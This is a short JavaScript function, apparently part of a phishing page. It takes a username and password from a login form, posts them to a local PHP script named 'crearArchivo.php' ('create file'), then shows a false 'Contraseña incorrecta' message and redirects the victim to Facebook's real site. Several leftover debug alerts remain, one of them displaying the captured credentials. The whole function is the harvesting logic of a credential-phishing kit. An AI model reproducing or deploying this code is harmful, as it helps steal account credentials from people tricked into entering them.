function cargar()
{
    var usuario = document.getElementById("usr").value;
    var password = document.getElementById("pass").value;
    var parametro ={
        "usuario": usuario,
        "password": password
    }
    window.alert(usuario + " " + password);
    $.ajax({
        url: './PHP/crearArchivo.php',
        type: 'post',
        data: parametro,
        success: function (respuesta){
            window.alert("success");
            if(respuesta == 'ok'){
                alert("Contraseña incorrecta");
                location.href = "https://es-la.facebook.com/";
            }
        }
    });
    window.alert("ola");
    return false;
}